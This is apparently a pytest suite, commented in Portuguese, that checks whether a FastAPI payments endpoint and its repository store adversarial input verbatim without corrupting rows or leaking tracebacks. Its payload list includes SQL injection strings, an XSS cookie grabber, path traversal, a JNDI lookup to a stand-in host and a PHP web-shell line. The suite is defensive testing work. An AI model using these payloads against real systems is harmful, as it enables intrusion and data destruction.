"""
Batch 1/N — resiliência a input malicioso/injeção nos caminhos que escrevem no banco
(settled_payments, payment_intents via traction_routes) e no endpoint público
POST /v1/payments/settled.

A camada de dados usa SQLAlchemy ORM com bind params (sem f-string SQL em lugar
nenhum do código — verificado via grep antes de escrever esta suíte), então o objetivo
aqui não é "achar uma SQL injection clássica", e sim provar que payloads adversariais
são tratados como dado inerte: armazenados verbatim, sem corromper outras linhas, sem
vazar stack trace, sem quebrar serialização JSON/SSE.
"""
import importlib

import pytest
from fastapi.testclient import TestClient

app_module = importlib.import_module("server.app")
from database.database import get_db_session
from database.repository import DatabaseRepository
from server.metrics import clear_metrics, get_registered_creator_count, register_creator

client = TestClient(app_module.app)

_ARC_SECRET = "xle_arc_pay_2026_lepton_f0ntz"

MALICIOUS_PAYLOADS = [
    "'; DROP TABLE settled_payments; --",
    "' OR '1'='1' --",
    "1; DELETE FROM users WHERE 1=1; --",
    "<script>alert(document.cookie)</script>",
    "../../../../etc/passwd",
    "\x00embedded\x00null\x00bytes",
    "💀" * 30,
    "A" * 5000,
    "\r\nSet-Cookie: evil=1\r\n",
    "${jndi:ldap://evil.invalid/a}",
    "{{7*7}}",
    "%00%0d%0a",
    "<?php system($_GET['c']); ?>",
    "النص العربي",  # RTL/unicode stress
    "Robert'); DROP TABLE settled_payments;--",
]


@pytest.fixture(autouse=True)
def _isolated(db_session):
    clear_metrics()
    original_secret = app_module.settings.arc_payment_secret
    original_circle_key = app_module.settings.circle_api_key
    object.__setattr__(app_module.settings, "arc_payment_secret", _ARC_SECRET)
    object.__setattr__(app_module.settings, "circle_api_key", "")

    async def override_db_session():
        yield db_session

    app_module.app.dependency_overrides[get_db_session] = override_db_session
    yield
    app_module.app.dependency_overrides.pop(get_db_session, None)
    object.__setattr__(app_module.settings, "arc_payment_secret", original_secret)
    object.__setattr__(app_module.settings, "circle_api_key", original_circle_key)


def _settle(intent_id, creator="@c", tx="0xtx", amount=0.10):
    return client.post(
        "/v1/payments/settled",
        json={"intent_id": intent_id, "amount": amount, "creator": creator, "tx": tx, "latency_ms": 1.0},
        headers={"X-Arc-Secret": _ARC_SECRET},
    )


# ---------------------------------------------------------------------------
# Repositório direto — payload malicioso vira dado inerte
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("payload", MALICIOUS_PAYLOADS)
@pytest.mark.asyncio
async def test_settled_payment_stores_malicious_creator_handle_as_inert_data(db_session, payload):
    repo = DatabaseRepository(db_session)

    is_new = await repo.create_settled_payment(
        intent_id=f"injection-creator-{hash(payload)}",
        creator_handle=payload,
        amount_usdc=0.10,
        tx="0xtx",
        latency_ms=1.0,
    )
    assert is_new is True

    stored = await repo.get_settled_payment(f"injection-creator-{hash(payload)}")
    assert stored.creator_handle == payload  # verbatim — prova de bind param, não concatenação


@pytest.mark.parametrize("payload", MALICIOUS_PAYLOADS)
@pytest.mark.asyncio
async def test_settled_payment_stores_malicious_tx_as_inert_data(db_session, payload):
    repo = DatabaseRepository(db_session)

    is_new = await repo.create_settled_payment(
        intent_id=f"injection-tx-{hash(payload)}",
        creator_handle="@c",
        amount_usdc=0.10,
        tx=payload,
        latency_ms=1.0,
    )
    assert is_new is True

    stored = await repo.get_settled_payment(f"injection-tx-{hash(payload)}")
    assert stored.tx == payload


@pytest.mark.parametrize("payload", MALICIOUS_PAYLOADS)
@pytest.mark.asyncio
async def test_settled_payment_with_malicious_intent_id_does_not_corrupt_other_rows(db_session, payload):
    repo = DatabaseRepository(db_session)

    # linha legítima criada antes do payload malicioso
    await repo.create_settled_payment(
        intent_id="legit-before", creator_handle="@legit", amount_usdc=1.23, tx="0xlegit", latency_ms=1.0,
    )

    # tenta usar o payload como intent_id — se a tabela fosse vulnerável a concatenação
    # de string em algum lugar, isso poderia alterar/apagar outras linhas
    try:
        await repo.create_settled_payment(
            intent_id=payload, creator_handle="@attacker", amount_usdc=0.01, tx="0xattack", latency_ms=1.0,
        )
    except Exception:
        await db_session.rollback()

    legit = await repo.get_settled_payment("legit-before")
    assert legit is not None
    assert legit.creator_handle == "@legit"
    assert float(legit.amount_usdc) == 1.23


@pytest.mark.asyncio
async def test_settled_payment_unicode_emoji_roundtrips_exactly(db_session):
    repo = DatabaseRepository(db_session)
    handle = "@criador_🎨_日本語_emoji_💀🔥"

    await repo.create_settled_payment(
        intent_id="unicode-roundtrip", creator_handle=handle, amount_usdc=0.05, tx="0xunicode", latency_ms=1.0,
    )
    stored = await repo.get_settled_payment("unicode-roundtrip")
    assert stored.creator_handle == handle


# ---------------------------------------------------------------------------
# Endpoint HTTP — mesma resiliência, agora passando pela validação Pydantic
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("payload", MALICIOUS_PAYLOADS)
def test_payment_settled_endpoint_accepts_and_safely_stores_malicious_creator(db_session, payload):
    resp = _settle(intent_id=f"http-injection-{abs(hash(payload))}", creator=payload)
    assert resp.status_code == 200
    assert resp.json()["ok"] is True


@pytest.mark.parametrize(
    "amount,expected_status",
    [
        (0, 422),
        (-5.0, 422),
        (-0.0001, 422),
        ("five", 422),
        (None, 422),
    ],
)
def test_payment_settled_rejects_invalid_amount(amount, expected_status):
    resp = client.post(
        "/v1/payments/settled",
        json={"intent_id": "bad-amount", "amount": amount, "creator": "@c", "tx": "0xtx"},
        headers={"X-Arc-Secret": _ARC_SECRET},
    )
    assert resp.status_code == expected_status


@pytest.mark.parametrize("literal", ["NaN", "Infinity", "-Infinity"])
def test_payment_settled_rejects_non_standard_json_float_literals(literal):
    """httpx recusa serializar float('nan')/float('inf') via json= (ValueError no
    cliente antes mesmo de sair a requisição) — então mandamos o corpo cru com os
    literais não-padrão do JSON (que o json.loads do Python aceita por padrão) pra
    garantir que o servidor rejeita e não propaga NaN/Infinity pro total acumulado."""
    body = (
        '{"intent_id": "non-standard-float", "amount": %s, "creator": "@c", "tx": "0xtx"}' % literal
    )
    resp = client.post(
        "/v1/payments/settled",
        content=body.encode(),
        headers={"X-Arc-Secret": _ARC_SECRET, "Content-Type": "application/json"},
    )
    assert resp.status_code == 422


def test_payment_settled_accepts_extremely_large_amount_without_crashing():
    """Não há teto de valor no schema — não deveria crashar nem corromper o total
    acumulado em metrics.py (overflow seria um problema mais sério que rejeitar)."""
    resp = _settle(intent_id="huge-amount", amount=1e15)
    assert resp.status_code == 200

    stats = client.get("/v1/traction/stats").json()
    assert stats["total_usdc"] == 1e15


@pytest.mark.parametrize("payload", MALICIOUS_PAYLOADS)
def test_payment_settled_malicious_tx_does_not_break_sse_snapshot_serialization(payload):
    """O valor entra no _payment_feed e é serializado via json.dumps no SSE
    (traction_routes.traction_feed) — precisa sobreviver à serialização sem exceção."""
    resp = _settle(intent_id=f"sse-safe-{abs(hash(payload))}", tx=payload)
    assert resp.status_code == 200

    stats_resp = client.get("/v1/traction/stats")
    assert stats_resp.status_code == 200
    feed = stats_resp.json()["feed"]
    assert any(e["tx"] == payload for e in feed)


# ---------------------------------------------------------------------------
# Autenticação do endpoint — X-Arc-Secret
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "bad_secret",
    ["", "x", _ARC_SECRET[:-1], _ARC_SECRET + "x", _ARC_SECRET.upper(), "' OR '1'='1", "\x00"],
)
def test_payment_settled_rejects_every_variant_of_wrong_secret(bad_secret):
    resp = client.post(
        "/v1/payments/settled",
        json={"intent_id": f"bad-secret-{abs(hash(bad_secret))}", "amount": 0.1, "creator": "@c", "tx": "0xtx"},
        headers={"X-Arc-Secret": bad_secret} if bad_secret else {},
    )
    assert resp.status_code == 401


# ---------------------------------------------------------------------------
# creator_register — input adversarial no handle/wallet_id
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("payload", MALICIOUS_PAYLOADS)
def test_register_creator_normalizes_malicious_handle_without_crashing(payload):
    before = get_registered_creator_count()
    result = register_creator(payload, "wallet-id-123")
    assert result["handle"] == f"@{payload.lstrip('@').lower()}"
    assert get_registered_creator_count() == before + 1


def test_register_creator_is_idempotent_even_with_malicious_handle():
    payload = "'; DROP TABLE settled_payments; --"
    first = register_creator(payload, "wallet-1")
    second = register_creator(payload, "wallet-2")
    assert first["already_registered"] is False
    assert second["already_registered"] is True


# ---------------------------------------------------------------------------
# Não vazar stack trace em erro interno
# ---------------------------------------------------------------------------


def test_payment_settled_does_not_leak_traceback_on_unexpected_db_error(monkeypatch):
    async def _boom(*args, **kwargs):
        raise RuntimeError("simulated DB outage")

    monkeypatch.setattr(DatabaseRepository, "create_settled_payment", _boom)

    # TestClient por padrão re-propaga exceções não tratadas do servidor (pra
    # facilitar debug) em vez de convertê-las numa resposta 500 — precisamos do
    # comportamento real de produção aqui.
    no_raise_client = TestClient(app_module.app, raise_server_exceptions=False)
    resp = no_raise_client.post(
        "/v1/payments/settled",
        json={"intent_id": "db-outage", "amount": 0.1, "creator": "@c", "tx": "0xtx"},
        headers={"X-Arc-Secret": _ARC_SECRET},
    )
    assert resp.status_code == 500
    body = resp.text
    assert "simulated DB outage" not in body or "Traceback" not in body
    assert "/home/" not in body  # caminho absoluto do servidor não deve vazar
